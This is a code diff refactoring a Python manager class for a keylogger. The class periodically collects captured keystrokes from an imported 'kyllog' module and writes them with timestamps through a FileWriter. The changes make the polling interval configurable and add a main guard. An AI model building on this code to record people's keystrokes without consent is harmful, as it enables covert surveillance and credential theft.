@@ -1,20 +1,20 @@
 import time,datetime ,ctypes,threading
-from kyllog import mein_keylogg
+from kyllog import MeinKeylogger
 from FileWriter import FileWriter
 
 
 class Manager:
 
-    def __init__(self):
-        self.keylogger = mein_keylogg()
+    def __init__(self,time):
+        self.time = time
+        self.keylogger = MeinKeylogger()
         self.file_writer = FileWriter()
-        self.buffer = []
         self.running = False
 
     def collect_keys(self):
         while self.running:
             try:
-                time.sleep(5)
+                time.sleep(self.time)
                 logged_keys = self.keylogger.get_logged_keys()
                 if logged_keys:
                     timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
@@ -46,9 +46,9 @@ class Manager:
         self.running = False
         self.keylogger.stop_logging()
 
-
-a = Manager()
-a.start()
+if __name__ == '__main__':
+    a = Manager(50)
+    a.start()
 
 
 
